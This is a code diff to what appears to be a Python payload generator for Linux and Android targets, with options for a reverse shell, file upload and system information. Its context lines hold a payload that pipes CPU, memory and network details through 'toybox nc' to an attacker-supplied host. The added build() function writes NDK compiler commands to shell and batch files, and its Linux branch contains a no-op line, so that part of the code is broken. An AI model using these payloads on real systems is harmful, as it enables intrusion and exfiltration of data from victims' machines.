@@ -19,14 +19,14 @@ arg_parser.add_argument("-u", action="store_true",
 arg_parser.add_argument("-z", action="store_true",
     help="Get system information")
 arg_parser.add_argument("-a", default="x86",
-    help="architecture: x86|arm")
+    help="architecture: x86|android target version")
 arg_parser.add_argument("-c", default="",
     help="command to execute on target")
 arg_parser.add_argument("-m", default="linux",
     help="Machine type: linux|android")
-arg_parser.add_argument("--ndk", help="Path to NDK")
-arg_parser.add_argument("--gcc", default="gcc",
-    help="Path to GCC (Overridden if NDK is supplied)")  
+arg_parser.add_argument("--ndk", help="Path to NDK toolchain")
+arg_parser.add_argument("--gcc", default="g++",
+    help="Path to GCC (Overridden if NDK toolchain is supplied)")  
 arg_parser.add_argument("sources", nargs="?")
 args = arg_parser.parse_args()
 
@@ -72,6 +72,20 @@ def system_info():
     elif args.m == "android":
        shellcode = "(cat /proc/cpuinfo && cat /proc/meminfo && ip a) | toybox nc -w 3 " + args.i + " " + args.p + "\n" 
     write_payload(shellcode)
+def build():
+    if args.m == "linux":
+        args.gcc + " " + args.sources
+    elif args.m == "android":
+        if args.a == "arm":
+            shellcode = args.ndk + "/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi23-clang++ -o a.out " + args.sources + "\n"
+            batchcode = args.ndk + "\\toolchains\\llvm\\prebuilt\\windows-x86_64\\bin\\armv7a-linux-androideabi23-clang++ -o a.out " + args.sources + "\n"
+        else:
+            shellcode = args.ndk + "/toolchains/llvm/prebuilt/linux-x86_64/bin/x86_64-linux-android23-clang++ -o a.out " + args.sources + "\n"
+            batchcode = args.ndk + "\\toolchains\\llvm\\prebuilt\\windows-x86_64\\bin\\x86_64-linux-android23-clang++ -o a.out " + args.sources + "\n"
+        write_payload(shellcode)
+        f = open(args.o + ".bat", "w")
+        f.write(batchcode)
+        f.close()
 
 if args.r:
     reverse_shell()
@@ -83,3 +97,5 @@ elif args.u:
     upload()
 elif args.z:
     system_info()
+else:
+    build()
